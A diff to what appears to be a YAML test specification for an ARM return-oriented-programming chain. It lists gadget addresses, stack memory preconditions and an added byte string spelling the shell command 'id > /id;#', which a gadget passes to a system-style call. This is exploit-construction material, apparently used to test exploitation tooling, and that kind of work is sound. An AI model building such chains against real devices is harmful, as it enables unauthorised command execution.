@@ -69,20 +69,31 @@ ropchain_simple:
 - preconditions:
     regs:
     mems:
-      '0xbeffc884': '0x15'  # [sp+2*4] == cmd
-      '0xbeffc885': '0xc2'
-      '0xbeffc886': '0xff'
-      '0xbeffc887': '0xbe'
-      '0xbeffc89c': '0xb8'  # [sp+8*4] == 0xc9b8
-      '0xbeffc89d': '0xc9'
-      '0xbeffc89e': '0x00'
-      '0xbeffc89f': '0x00'
+      '0xbeffc874': '0x90'  # [sp+2*4] == cmd_ptr
+      '0xbeffc875': '0xc2'
+      '0xbeffc876': '0xff'
+      '0xbeffc877': '0xbe'
+      '0xbeffc88c': '0xb8'  # [sp+8*4] == 0xc9b8
+      '0xbeffc88d': '0xc9'
+      '0xbeffc88e': '0x00'
+      '0xbeffc88f': '0x00'
   instructions:
   - ['0x0000cf24', f0 8f bd e8, 'pop {r4, r5, r6, r7, r8, sb, sl, fp, pc}', '']
 # Gadget 1
 - preconditions:
     regs:
     mems:
+      '0xbeffc290': '0x69'  # 'i'
+      '0xbeffc291': '0x64'  # 'd'
+      '0xbeffc292': '0x20'  # ' '
+      '0xbeffc293': '0x3e'  # '>'
+      '0xbeffc294': '0x20'  # ' '
+      '0xbeffc295': '0x2f'  # '/'
+      '0xbeffc296': '0x69'  # 'i'
+      '0xbeffc297': '0x64'  # 'd'
+      '0xbeffc298': '0x3b'  # ';'
+      '0xbeffc299': '0x23'  # '#'
+      '0xbeffc29a': '0x00'  #
   instructions:
   - ['0x0000c9b8', '06 00 a0 e1', 'mov r0, r6', '']
   - ['0x0000c9bc', 'b7 f2 ff eb', 'bl #0x94a0', '']
